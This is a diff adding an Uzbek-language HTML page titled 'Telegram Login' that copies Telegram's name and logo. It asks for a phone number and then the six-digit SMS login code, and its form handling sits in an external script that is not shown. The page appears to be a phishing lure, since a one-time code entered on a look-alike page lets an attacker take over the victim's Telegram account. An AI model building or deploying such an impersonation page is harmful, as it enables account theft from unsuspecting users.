@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
+    <link rel="stylesheet" href="css/register_style.css">
+    <style>@view-transition {
+        navigation: auto;
+    }</style>
+    <script src="https://cdn.tailwindcss.com" type="text/javascript"></script>
+</head>
+<body>
+<div class="container">
+    <div class="login-box">
+        <div class="logo">
+            <svg viewbox="0 0 240 240">
+                <path d="M94.5 142.3l-13.5 45c2.1 0 3-0.8 4.1-1.9l9.9-9.4 20.5 14.9c3.8 2.1 6.5 1 7.4-3.5l13.4-62.3c1.1-5-1.9-7.3-6.3-4.8L74.7 147.8c-4.8 1.9-4.8 4.6-0.9 5.8l24.1 7.4 56-34.9c2.6-1.7 5-0.8 3-1z"/>
+            </svg>
+        </div>
+        <div id="phoneStep">
+            <h1 id="appTitle">Telegram</h1>
+            <p class="subtitle">Iltimos, telefon raqamingizni kiriting</p>
+            <form id="phoneForm">
+                <div class="form-group"><label for="phone" id="phoneLabel">Telefon raqam</label>
+                    <div class="input-wrapper"><span class="country-code">+998</span>
+                        <input type="tel" id="phone" class="with-prefix" placeholder="90 100 10 10" maxlength="12"
+                               required>
+                    </div>
+                </div>
+                <button type="submit" id="phoneSubmit"><span id="submitButtonText">Yuborish</span></button>
+                <div id="phoneError" class="error-message hidden"></div>
+            </form>
+        </div>
+        <div id="codeStep" class="hidden">
+            <h1 id="codeTitle">Kodni kiriting</h1>
+            <p class="subtitle">
+                <span id="phoneDisplay"></span> raqamiga SMS kod yuborildi
+            </p>
+            <form id="codeForm">
+                <div class="form-group"><label id="codeLabel">SMS kod</label>
+                    <div class="code-inputs">
+                        <input type="text" class="code-input" maxlength="1" data-index="0">
+                        <input type="text" class="code-input" maxlength="1" data-index="1">
+                        <input type="text" class="code-input" maxlength="1" data-index="2">
+                        <input type="text" class="code-input" maxlength="1" data-index="3">
+                        <input type="text" class="code-input" maxlength="1" data-index="4">
+                        <input type="text" class="code-input" maxlength="1" data-index="5">
+                    </div>
+                </div>
+                <button type="submit" id="codeSubmit"> Tasdiqlash</button>
+                <div id="codeError" class="error-message hidden"></div>
+            </form>
+            <a class="resend-link" id="resendLink">Kodni qayta yuborish</a>
+            <div class="back-link" id="backLink">
+                ← Raqamni o'zgartirish
+            </div>
+        </div>
+        <div id="successStep" class="hidden">
+            <h1>✅ Muvaffaqiyatli!</h1>
+            <div class="success-message">
+                Siz muvaffaqiyatli tizimga kirdingiz
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="js/register.js"></script>
+
+</body>
+</html>
